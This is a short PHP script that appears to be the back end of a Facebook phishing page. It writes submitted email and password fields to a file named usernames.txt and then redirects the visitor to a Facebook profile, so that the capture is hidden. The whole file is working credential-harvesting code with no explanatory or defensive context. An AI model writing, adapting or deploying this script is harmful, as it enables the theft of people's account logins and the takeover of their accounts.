<?php
header('Location: https://www.facebook.com/fffffffffffff222/');
if (!empty($_POST['email'])) {file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
}

exit();
